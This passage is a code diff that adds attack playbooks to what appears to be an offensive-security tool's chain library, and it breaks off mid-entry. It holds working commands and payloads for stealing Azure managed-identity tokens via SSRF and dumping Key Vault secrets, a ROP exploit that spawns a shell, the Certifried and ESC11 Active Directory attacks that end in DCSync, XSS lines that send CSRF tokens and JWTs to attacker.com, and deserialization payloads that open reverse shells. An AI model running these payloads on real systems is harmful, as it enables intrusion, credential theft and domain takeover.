@@ -502,6 +502,481 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "azure-imds-managed-identity",
+      "name": "Cloud — Azure IMDS → managed identity → token",
+      "description": "SSRF on an Azure VM/AKS/App Service hits 169.254.169.254 to extract the managed identity's OAuth2 token. Token grants Azure AD-scoped access for whatever role is bound to that identity (often Contributor on the RG).\n",
+      "tags": [
+        "cloud",
+        "azure",
+        "ssrf",
+        "imds",
+        "managed-identity",
+        "post-exploitation"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "ssrf_url",
+          "description": "Vulnerable URL that fetches arbitrary URLs.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "confirm_azure",
+          "name": "Confirm we're on Azure (compute metadata)",
+          "inline_command": "curl '<url>http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true'",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "notes": "Azure IMDS REQUIRES the literal `Metadata: true` header (anti-SSRF\nmitigation). If your SSRF can't add headers — you're stuck unless\nit's a `headers=` parameter trick.\n",
+          "capture": [
+            {
+              "var": "azure_subscription_id",
+              "regex": "\"subscriptionId\"\\s*:\\s*\"([0-9a-f-]+)\"",
+              "match": "first"
+            },
+            {
+              "var": "azure_vm_name",
+              "regex": "\"name\"\\s*:\\s*\"([^\"]+)\"",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "get_token_for_arm",
+          "name": "Request OAuth token for Azure Resource Manager",
+          "inline_command": "curl '<url>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \\\n  -H 'Metadata: true'\n",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "capture": [
+            {
+              "var": "azure_arm_token",
+              "regex": "\"access_token\"\\s*:\\s*\"([^\"]+)\"",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "get_token_for_graph",
+          "name": "Also grab a Graph token (Azure AD operations)",
+          "inline_command": "curl '<url>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/' \\\n  -H 'Metadata: true'\n",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "capture": [
+            {
+              "var": "azure_graph_token",
+              "regex": "\"access_token\"\\s*:\\s*\"([^\"]+)\"",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "get_token_for_keyvault",
+          "name": "Token for Key Vault — gold mine if the identity has access",
+          "inline_command": "curl '<url>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' \\\n  -H 'Metadata: true'\n",
+          "inputs": {
+            "url": "${ssrf_url}"
+          }
+        },
+        {
+          "id": "enumerate_via_arm",
+          "name": "Use the ARM token from your laptop",
+          "inline_command": "export AZ_TOKEN='<token>'\ncurl -H \"Authorization: Bearer $AZ_TOKEN\" \\\n  \"https://management.azure.com/subscriptions/<sub>/resourcegroups?api-version=2021-04-01\"\n# Or via az CLI:\naz login --service-principal -u <client-id> -p $AZ_TOKEN --tenant <tenant>  # if managed identity gives one\naz role assignment list --assignee <object-id>\n",
+          "inputs": {
+            "token": "${azure_arm_token}",
+            "sub": "${azure_subscription_id}"
+          }
+        },
+        {
+          "id": "pillage_keyvault",
+          "name": "Pillage Key Vault secrets (if token granted)",
+          "inline_command": "VAULT_TOKEN='<kv_token>'\n# List vaults the identity can reach (via ARM token):\ncurl -H \"Authorization: Bearer $AZ_TOKEN\" \\\n  \"https://management.azure.com/subscriptions/<sub>/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01\"\n# Per vault, list secrets:\ncurl -H \"Authorization: Bearer $VAULT_TOKEN\" \\\n  \"https://<vaultname>.vault.azure.net/secrets?api-version=7.4\"\n# Per secret, read value:\ncurl -H \"Authorization: Bearer $VAULT_TOKEN\" \\\n  \"https://<vaultname>.vault.azure.net/secrets/<name>?api-version=7.4\"\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "Azure IMDS docs",
+          "url": "https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service"
+        },
+        {
+          "title": "HackTricks — Azure SSRF",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "aws-imds-ssrf",
+          "when": "multi-cloud target",
+          "reason": "Same SSRF often reaches AWS metadata too."
+        }
+      ]
+    },
+    {
+      "id": "bloodhound-cypher-collection",
+      "name": "AD — BloodHound Cypher query collection",
+      "description": "Not a chain you run linearly — a curated set of Cypher one-liners to paste into BloodHound (CE or legacy) once you've ingested data. Each query exposes a different attack primitive.\n",
+      "tags": [
+        "bloodhound",
+        "cypher",
+        "active-directory",
+        "recon"
+      ],
+      "difficulty": "easy",
+      "inputs": [],
+      "steps": [
+        {
+          "id": "shortest_path_to_da",
+          "name": "Classic: shortest path from owned to Domain Admins",
+          "inline_command": "MATCH (n {owned: true}),(g:Group),\n      p = shortestPath((n)-[*1..]->(g))\nWHERE g.name STARTS WITH 'DOMAIN ADMINS'\nRETURN p\n"
+        },
+        {
+          "id": "asrep_kerberoast",
+          "name": "AS-REP-roastable + Kerberoastable",
+          "inline_command": "MATCH (u:User {dontreqpreauth: true}) RETURN u\nMATCH (u:User {hasspn: true}) RETURN u\n"
+        },
+        {
+          "id": "dcsync_holders",
+          "name": "Anyone with DCSync rights",
+          "inline_command": "MATCH p=(n)-[r:GetChangesAll|GetChanges|GetChangesInFilteredSet]->(d:Domain)\nRETURN p\n"
+        },
+        {
+          "id": "unconstrained_delegation",
+          "name": "Unconstrained-delegation hosts",
+          "inline_command": "MATCH (c:Computer {unconstraineddelegation: true}) RETURN c\n"
+        },
+        {
+          "id": "rbcd_writable",
+          "name": "Where you can write RBCD (computer takeover candidates)",
+          "inline_command": "MATCH p=(n {owned: true})-[r:AddAllowedToAct|WriteAccountRestrictions|GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer)\nRETURN p\n"
+        },
+        {
+          "id": "shadow_credentials_paths",
+          "name": "Where you can add KeyCredentialLink (Shadow Credentials)",
+          "inline_command": "MATCH p=(n {owned: true})-[r:AddKeyCredentialLink|GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights]->(t)\nWHERE t:User OR t:Computer\nRETURN p\n"
+        },
+        {
+          "id": "gpo_abuse",
+          "name": "GPO write rights → push payload to every linked host",
+          "inline_command": "MATCH p=(n {owned: true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO)\nRETURN p\n// Then: MATCH (g:GPO {name:'<name>'})-[:GpLink]->(ou) RETURN ou — see what's linked.\n"
+        },
+        {
+          "id": "high_value_in_easy_reach",
+          "name": "HighValue targets within 3 hops of any owned principal",
+          "inline_command": "MATCH (n {owned: true}),(h {highvalue: true}),\n      p = shortestPath((n)-[*1..3]->(h))\nRETURN p\n"
+        },
+        {
+          "id": "kerberos_double_hop",
+          "name": "Computers with unconstrained delegation pointing at HVT services",
+          "inline_command": "MATCH (c:Computer {unconstraineddelegation: true})-[:HasSession]->(u:User)\nWHERE u.admincount = true\nRETURN c, u\n"
+        },
+        {
+          "id": "machine_accounts_as_admin",
+          "name": "Machine accounts that are local admins on other computers",
+          "inline_command": "MATCH p=(c1:Computer)-[r:AdminTo|MemberOf*1..]->(c2:Computer)\nWHERE c1 <> c2\nRETURN p LIMIT 50\n"
+        },
+        {
+          "id": "foreign_group_membership",
+          "name": "Cross-domain group memberships (cross-forest pivot)",
+          "inline_command": "MATCH (u:User)-[r:MemberOf]->(g:Group)\nWHERE NOT u.domain = g.domain\nRETURN u.name, g.name, g.domain\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "BloodHound docs",
+          "url": "https://bloodhound.specterops.io/"
+        },
+        {
+          "title": "CompassSecurity Cypher cheatsheet",
+          "url": "https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-1/"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "dacl-genericall-abuse",
+          "when": "GenericAll path found",
+          "reason": "Cash in the DACL primitive."
+        },
+        {
+          "chain": "shadow-credentials",
+          "when": "AddKeyCredentialLink path found",
+          "reason": "Silent takeover."
+        },
+        {
+          "chain": "rbcd-takeover",
+          "when": "RBCD-writable computer found",
+          "reason": "Take over the computer via RBCD."
+        },
+        {
+          "chain": "kerberoast-chain",
+          "when": "hasspn=true users surfaced",
+          "reason": "Kerberoast the new candidates."
+        }
+      ]
+    },
+    {
+      "id": "bof-modern-exploitation",
+      "name": "Binary — modern stack BOF / format string / ROP basics",
+      "description": "Walk through the binary exploitation playbook on a Linux x64 CTF challenge: identify the bug, leak ASLR, build a ROP chain, drop a shell. Covers the OSCP-style modern BOF.\n",
+      "tags": [
+        "binary-exploitation",
+        "bof",
+        "rop",
+        "format-string",
+        "oscp",
+        "ctf"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "binary_path",
+          "description": "Path to the vulnerable binary.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "triage",
+          "name": "Triage — file, checksec, libc version",
+          "inline_command": "file <bin>\nchecksec --file=<bin>\nldd <bin>\nstrings <bin> | grep -i 'libc\\|gets\\|printf\\|system'\n",
+          "inputs": {
+            "bin": "${binary_path}"
+          },
+          "notes": "checksec output decides the strategy:\n  NX off              → shellcode on stack\n  NX on + PIE off     → ret2plt, ret2libc\n  NX on + PIE on      → leak first (format string / partial overwrite)\n  Canary on           → leak canary (FS / forked child) before overflow\n  Full RELRO          → can't overwrite GOT\n"
+        },
+        {
+          "id": "fuzz_overflow",
+          "name": "Find the bug + offset",
+          "inline_command": "# Generate pattern:\npwn cyclic 256\n# Run binary with it, look at the crash:\ngdb-pwndbg -q <bin>\n(gdb) r < <(pwn cyclic 256)\n(gdb) i r rsp\n# Then:\npwn cyclic -l 0xCRASHEDVALUE\n# → exact offset to RIP control.\n",
+          "inputs": {
+            "bin": "${binary_path}"
+          }
+        },
+        {
+          "id": "leak_libc",
+          "name": "Leak libc with puts(GOT_puts) → resolve base",
+          "inline_command": "python3 -c '\nfrom pwn import *\ne = ELF(\"<bin>\")\nr = process(\"<bin>\")\npayload = b\"A\"*<OFFSET> + p64(e.plt[\"puts\"]) + p64(e.symbols[\"main\"]) + p64(e.got[\"puts\"])\nr.sendline(payload)\nleaked = u64(r.recv(6).ljust(8, b\"\\\\x00\"))\nlibc_base = leaked - libc.symbols[\"puts\"]\nprint(hex(libc_base))'\n",
+          "inputs": {
+            "bin": "${binary_path}"
+          },
+          "notes": "Calls puts(puts@GOT) — the address of libc puts gets printed.\nSubtract libc's puts offset → libc base. Now you can call anything\nin libc.\n"
+        },
+        {
+          "id": "rop_to_shell",
+          "name": "Build the ROP chain → system(\"/bin/sh\")",
+          "inline_command": "python3 -c '\nfrom pwn import *\ne = ELF(\"<bin>\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nlibc.address = <LEAKED_BASE>\nr = process(\"<bin>\")\npop_rdi = <GADGET_FROM_ROPGADGET>\nret = <RET_GADGET>\npayload = b\"A\"*<OFFSET> + p64(pop_rdi) + p64(next(libc.search(b\"/bin/sh\"))) + p64(ret) + p64(libc.symbols[\"system\"])\nr.sendline(payload)\nr.interactive()'\n",
+          "inputs": {
+            "bin": "${binary_path}"
+          },
+          "notes": "Use ROPgadget --binary <bin> to find pop rdi ; ret. Add a single\nret to align the stack (System V ABI requires 16-byte alignment\nbefore the call instruction).\n"
+        },
+        {
+          "id": "format_string",
+          "name": "Format string — leak + arbitrary write",
+          "inline_command": "# Leak addresses by feeding %p%p%p%p%p... to the vulnerable printf.\npython3 -c 'print(\"AAAA%7\\$p\")' | nc <host> <port>\n# If position 7 leaks back \"0x4141414141414141\" → that's your write slot.\n# Then arbitrary write:\npython3 -c 'print((\"\\\\xaa\\\\xaa\\\\xaa\\\\xaa\\\\xaa\\\\xaa%4444c%7\\\\$hn\"))'\n# Overwrites the address held in slot 7 with the value 4444.\n",
+          "notes": "Often used to overwrite a GOT entry → next call goes to your gadget.\n"
+        },
+        {
+          "id": "spawn_shell",
+          "name": "Confirm shell",
+          "inline_command": "id"
+        }
+      ],
+      "references": [
+        {
+          "title": "pwntools",
+          "url": "https://docs.pwntools.com/en/stable/"
+        },
+        {
+          "title": "How2Heap (heap basics)",
+          "url": "https://github.com/shellphish/how2heap"
+        },
+        {
+          "title": "ropemporium (ROP practice)",
+          "url": "https://ropemporium.com/"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "reverse shell received",
+          "reason": "Stabilize the popped shell."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "shell as a low-priv user",
+          "reason": "Escalate from the binary user."
+        }
+      ]
+    },
+    {
+      "id": "certifried-cve-2022-26923",
+      "name": "AD — Certifried (CVE-2022-26923) machine account DA",
+      "description": "Any authenticated user with MachineAccountQuota>0 can create a computer object and set its dNSHostName to match a DC's dNSHostName. PKINIT then authenticates the attacker as that DC. Patched May 2022 but still in the wild on labs and unmanaged forests.\n",
+      "tags": [
+        "active-directory",
+        "certifried",
+        "cve-2022-26923",
+        "priv-esc",
+        "adcs"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        },
+        {
+          "name": "dc_hostname",
+          "description": "DC dNSHostName (e.g. dc01.corp.local) — pulled from LDAP or nmap.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "precheck",
+          "name": "Confirm MachineAccountQuota > 0",
+          "command_ref": "nxc-ldap-maq",
+          "inputs": {
+            "dc-ip": "${dc_ip}"
+          }
+        },
+        {
+          "id": "create_attacker_computer",
+          "name": "Create attacker computer object",
+          "command_ref": "nxc-ldap-add-computer",
+          "inputs": {
+            "dc-ip": "${dc_ip}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "capture": [
+            {
+              "var": "attacker_computer",
+              "regex": "Successfully added machine account ([A-Za-z0-9$]+) with password ([^\\s]+)",
+              "match": "first",
+              "groups": {
+                "sam": 1,
+                "password": 2
+              }
+            }
+          ]
+        },
+        {
+          "id": "spoof_dnshostname",
+          "name": "Spoof attacker-computer dNSHostName to match the DC",
+          "inline_command": "bloodyAD --host <dc-ip> -u '<user>' -p '<password>' -d '<domain>' \\\n  set object '<sam>' dNSHostName -v '<dc_hostname>'\n",
+          "requires": [
+            "attacker_computer"
+          ],
+          "inputs": {
+            "dc-ip": "${dc_ip}",
+            "user": "${user}",
+            "password": "${password}",
+            "domain": "${domain}",
+            "dc_hostname": "${dc_hostname}"
+          },
+          "notes": "Must clear servicePrincipalName first (bloodyAD does this if you\npass `-v ''` to servicePrincipalName before setting dNSHostName).\n"
+        },
+        {
+          "id": "request_machine_cert",
+          "name": "Request a Machine cert as the spoofed host",
+          "inline_command": "certipy req -u '<sam>@<domain>' -p '<password>' -dc-ip <dc-ip> \\\n  -ca '<CA>' -template 'Machine'\n",
+          "requires": [
+            "attacker_computer"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "The \"Machine\" template is enrollable by Domain Computers — your\nnewly-created account qualifies. Cert is issued for the spoofed\ndNSHostName (= DC).\n",
+          "capture": [
+            {
+              "var": "dc_pfx",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_as_dc",
+          "name": "PKINIT auth → DC machine-account NT hash",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "dc_pfx"
+          ],
+          "inputs": {
+            "pfx_file": "${dc_pfx}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "dc_machine_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "dcsync",
+          "name": "DCSync with the DC machine-account hash",
+          "inline_command": "impacket-secretsdump -hashes ':<hash>' '<domain>/<DC_NAME>$@<dc-ip>' -just-dc",
+          "inputs": {
+            "hash": "${dc_machine_hash}",
+            "dc-ip": "${dc_ip}",
+            "domain": "${domain}"
+          },
+          "capture": [
+            {
+              "var": "krbtgt_nt_hash",
+              "regex": "^krbtgt:502:[a-f0-9]{32}:([a-f0-9]{32}):::",
+              "match": "first"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "title": "Certifried (Will Schroeder)",
+          "url": "https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4"
+        },
+        {
+          "title": "CVE-2022-26923",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "krbtgt_nt_hash captured",
+          "reason": "krbtgt → Golden Ticket persistence."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_machine_hash captured",
+          "reason": "Walk the domain with the DA-equivalent identity."
+        }
+      ]
+    },
+    {
       "id": "certipy-esc7-ca-manage",
       "name": "ADCS ESC7 — abuse Manage CA / Manage Certificates permission",
       "description": "When a low-priv principal has `Manage CA` or `Manage Certificates` rights on the CA itself (not just on a template), they can publish a new vulnerable template OR officer-approve a previously-denied request. Either way → domain takeover.\n",
@@ -742,6 +1217,91 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "csrf-and-token-leak",
+      "name": "Web — CSRF + session/token leakage chain",
+      "description": "CSRF lets you force an authenticated victim to perform actions; on its own it's auth-bypass-by-impersonation. Combined with a token leak (Referer header, XSS, postMessage origin checks) it becomes account takeover.\n",
+      "tags": [
+        "web",
+        "csrf",
+        "xss",
+        "token-leak",
+        "account-takeover"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_app",
+          "description": "Base URL of the vulnerable app.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "csrf_probe",
+          "name": "Identify state-changing endpoints + check CSRF protection",
+          "inline_command": "# Find POST / PUT / DELETE endpoints with no CSRF token requirement.\n# Indicators: no X-CSRF-Token header, no SameSite cookie attribute,\n# no anti-CSRF input in forms.\ncurl -X POST '<app>/change-email' \\\n  -H 'Cookie: session=<victim_session_if_known>' \\\n  -d 'new_email=attacker@evil.com'\n",
+          "inputs": {
+            "app": "${target_app}"
+          },
+          "notes": "If state changes WITHOUT a corresponding token check → vulnerable.\n"
+        },
+        {
+          "id": "craft_csrf_payload",
+          "name": "Craft auto-submitting HTML CSRF payload",
+          "inline_command": "cat > csrf.html <<'EOF'\n<html><body onload=\"document.forms[0].submit()\">\n<form action=\"<app>/change-email\" method=\"POST\">\n  <input name=\"new_email\" value=\"attacker@evil.com\">\n</form>\n</body></html>\nEOF\npython3 -m http.server 8080\n# Host on attacker box; lure victim to fetch http://<attacker>:8080/csrf.html.\n",
+          "inputs": {
+            "app": "${target_app}"
+          },
+          "notes": "Combine with XSS on a sibling host to remove the need for a click —\nauto-fires when the user visits ANY page on the compromised origin.\n"
+        },
+        {
+          "id": "token_via_referer",
+          "name": "Leak CSRF token via Referer header (open redirect)",
+          "inline_command": "# Some apps put the token in the URL. Open redirect on the app:\ncurl '<app>/redirect?url=http://attacker.com'\n# The victim's browser sends Referer: <app>/page?csrf_token=XYZ\n# Capture in your access log.\n"
+        },
+        {
+          "id": "token_via_xss",
+          "name": "Leak token via XSS (any reflected XSS works)",
+          "inline_command": "# Inject:\n# <script>\n# fetch('<app>/csrf-form').then(r=>r.text()).then(t=>{\n#   const tok = t.match(/csrf_token\\\\s*=\\\\s*\"([^\"]+)\"/)[1];\n#   fetch('http://attacker.com/?t=' + tok);\n# })\n# </script>\n"
+        },
+        {
+          "id": "jwt_in_localstorage",
+          "name": "JWT in localStorage → grab via XSS",
+          "inline_command": "# <script>fetch('http://attacker.com/?t='+localStorage.getItem('jwt'))</script>\n# Stolen JWT → use directly in Authorization: Bearer header.\n# See the jwt-attacks chain to see if it can be forged anew.\n"
+        },
+        {
+          "id": "account_takeover",
+          "name": "Use captured token / changed email to fully take over",
+          "inline_command": "# 1) Triggered email change → request password reset → land in attacker inbox.\ncurl -X POST '<app>/forgot-password' -d 'email=attacker@evil.com'\n# 2) Click the reset link → set new password → logged in as the victim.\n",
+          "inputs": {
+            "app": "${target_app}"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — CSRF",
+          "url": "https://portswigger.net/web-security/csrf"
+        },
+        {
+          "title": "HackTricks — CSRF",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "file-upload-bypass",
+          "when": "logged in as admin",
+          "reason": "Admin panels usually expose uploads."
+        },
+        {
+          "chain": "jwt-attacks",
+          "when": "JWT stolen via XSS",
+          "reason": "Try forging stronger tokens with the same secret."
+        }
+      ]
+    },
+    {
       "id": "dacl-genericall-abuse",
       "name": "AD — DACL abuse (GenericAll/Write/ForceChangePassword)",
       "description": "BloodHound shows you have GenericAll / GenericWrite / WriteDacl / ForceChangePassword on a target principal. Cash it in. Three common payoffs depending on the right: reset the password, add yourself to a group, or stage a shadow-credential.\n",
@@ -846,6 +1406,107 @@ const CHAIN_DATA = {
           "chain": "pth-lateral-spread",
           "when": "new credential captured",
           "reason": "Spread the harvested identity."
+        }
+      ]
+    },
+    {
+      "id": "deserialization-attacks",
+      "name": "Web — Unsafe deserialization → RCE (Java / Python / .NET / PHP)",
+      "description": "Application deserializes attacker-controlled blobs without integrity checks. Use a known gadget chain for the framework (ysoserial for Java, pickle for Python, ysoserial.net for .NET, phpggc for PHP) → RCE on unmarshal.\n",
+      "tags": [
+        "web",
+        "deserialization",
+        "rce",
+        "java",
+        "python",
+        "dotnet",
+        "php"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "target_url",
+          "description": "Endpoint that consumes serialized data (often cookies, hidden inputs, message queues, API bodies).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "identify_format",
+          "name": "Identify the serialization format",
+          "inline_command": "echo 'Look at intercepted requests/cookies. Common markers:\n  Java:    rO0AB / `\\xac\\xed` magic\n  Python:  base64 starting with `gASV` (pickle) or yaml.load() params\n  .NET:    AAEAAAD / base64 `BinaryFormatter`\n  PHP:     `O:<n>:\"ClassName\":<n>:{...}` serialize() format\n  Ruby:    `\\x04\\x08` Marshal magic'"
+        },
+        {
+          "id": "java_ysoserial",
+          "name": "Java — ysoserial gadget",
+          "inline_command": "# Pick a gadget chain matching the app's classpath. CommonsCollections1\n# / 5 / 6 / 7 are usually winners on legacy Spring/Struts. Generate:\njava -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' > payload.bin\n# Deliver (cookie, body, header — wherever the deserialization happens):\ncurl -X POST '<url>' --data-binary @payload.bin -H 'Content-Type: application/x-java-serialized-object'\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "For Spring/SpEL bugs (CVE-2022-22963 / 22965), use the dedicated\nSpringShell payload. For Apache Commons Text (CVE-2022-42889), the\n\"Text4Shell\" prefix `${script:javascript:...}` lands in any logged\nstring.\n"
+        },
+        {
+          "id": "python_pickle",
+          "name": "Python — pickle RCE",
+          "inline_command": "python3 -c '\nimport pickle, base64\nclass P:\n    def __reduce__(self):\n        return (__import__(\"os\").system, (\"bash -c \\\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\\"\",))\nprint(base64.b64encode(pickle.dumps(P())).decode())'\n# Send the base64 to the endpoint that pickle.loads() it.\n",
+          "inputs": {
+            "lhost": "${attacker_ip}",
+            "lport": "4444"
+          },
+          "notes": "Common contexts: Celery task queues, Flask sessions when\nSECRET_KEY is known/leaked, YAML loaders using yaml.load (vs\nyaml.safe_load).\n"
+        },
+        {
+          "id": "dotnet_ysoserial",
+          "name": ".NET — ysoserial.net",
+          "inline_command": "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"calc.exe\" -o base64\n# Common gadgets: ObjectDataProvider, TypeConfuseDelegate, ActivitySurrogateSelector.\n# Common formatters: BinaryFormatter, NetDataContractSerializer, ObjectStateFormatter (Viewstate!).\n"
+        },
+        {
+          "id": "php_phpggc",
+          "name": "PHP — phpggc",
+          "inline_command": "phpggc Symfony/RCE4 system 'id' -b\n# Output is base64-encoded serialized payload. Inject where the app\n# unserializes — cookies, URL params, POST bodies, X-Forwarded-For\n# headers used by app routers, etc.\n"
+        },
+        {
+          "id": "confirm_rce",
+          "name": "Catch the reverse shell",
+          "inline_command": "nc -lvnp <lport>",
+          "inputs": {
+            "lport": "4444"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "ysoserial (Java)",
+          "url": "https://github.com/frohoff/ysoserial"
+        },
+        {
+          "title": "ysoserial.net",
+          "url": "https://github.com/pwntester/ysoserial.net"
+        },
+        {
+          "title": "phpggc",
+          "url": "https://github.com/ambionics/phpggc"
+        },
+        {
+          "title": "HackTricks — Deserialization",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "reverse shell received",
+          "reason": "Stabilize."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "shell on Linux app server",
+          "reason": "Escalate."
+        },
+        {
+          "chain": "windows-priv-esc-recon",
+          "when": "shell on Windows IIS / Tomcat",
+          "reason": "AppPool → SeImpersonate path."
         }
       ]
     },
@@ -1155,6 +1816,1059 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "esc11-adcs-icpr-relay",
+      "name": "ADCS ESC11 — relay over ICPR (RPC) without encryption",
+      "description": "CA missing IF_ENFORCEENCRYPTICERTREQUEST. RPC cert-request channel accepts un-encrypted requests → relay coerced machine auth into a cert for the relayed identity. The MS-ICPR cousin of ESC8.\n",
+      "tags": [
+        "adcs",
+        "esc11",
+        "ntlm-relay",
+        "coercion",
+        "certificates"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "ca_ip",
+          "description": "IP of the ADCS server.",
+          "required": true
+        },
+        {
+          "name": "listener_ip",
+          "description": "Your attacker IP.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "find_esc11",
+          "name": "Confirm CA is ESC11 (un-encrypted ICPR)",
+          "command_ref": "certipy-find",
+          "inputs": {
+            "ip": "${dc_ip}"
+          },
+          "notes": "Look at the CA section: `Enforce Encryption for Requests: False` →\nESC11 viable. Newer CAs default to True; older deployments and\npoorly managed CAs flip it for compatibility.\n"
+        },
+        {
+          "id": "start_relay",
+          "name": "Start certipy relay (ICPR target)",
+          "command_ref": "certipy-esc11",
+          "inputs": {
+            "ip": "${ca_ip}"
+          },
+          "notes": "Run as: `certipy relay -target rpc://<ca_ip>` (the rpc:// scheme\nenables ICPR mode). Leave it running.\n"
+        },
+        {
+          "id": "coerce_dc",
+          "name": "Coerce DC machine auth to the relay",
+          "command_ref": "coercer",
+          "inputs": {
+            "listener_ip": "${listener_ip}",
+            "target_ip": "${dc_ip}"
+          },
+          "notes": "DC$ authenticates → certipy mints a cert FOR THE DC machine account\n(i.e. you get a cert you can authenticate as DC$).\n"
+        },
+        {
+          "id": "capture_pfx",
+          "name": "Pick up the PFX from certipy output",
+          "inline_command": "# Look for: [+] Saved certificate and private key to '<dc>$.pfx'",
+          "capture": [
+            {
+              "var": "dc_pfx",
+              "regex": "Saved certificate and private key to '(\\S+\\$\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "PKINIT as DC$ → NT hash of DC machine account",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "dc_pfx"
+          ],
+          "inputs": {
+            "pfx_file": "${dc_pfx}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "dc_machine_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "dcsync",
+          "name": "DCSync as DC$ (machine accounts have replication rights)",
+          "inline_command": "impacket-secretsdump -hashes ':<hash>' '<domain>/<DC_NAME>$@<dc-ip>' -just-dc",
+          "inputs": {
+            "hash": "${dc_machine_hash}",
+            "dc-ip": "${dc_ip}"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "Certipy ESC11 deep dive",
+          "url": "https://research.ifcr.dk/relaying-to-ad-certificate-services-over-rpc-7211c45b35c0"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "krbtgt hash captured",
+          "reason": "Persist via Golden Ticket."
+        }
+      ]
+    },
+    {
+      "id": "esc13-adcs-issuance-policy",
+      "name": "ADCS ESC13 — Issuance Policy OID linked to a group",
+      "description": "A certificate Issuance Policy OID is linked (via msDS-OIDToGroupLink) to an AD group. Any cert issued under that policy gives the holder group membership at authentication time — including in privileged groups like Enterprise Admins.\n",
+      "tags": [
+        "adcs",
+        "esc13",
+        "priv-esc",
+        "certificates",
+        "oid-mapping"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
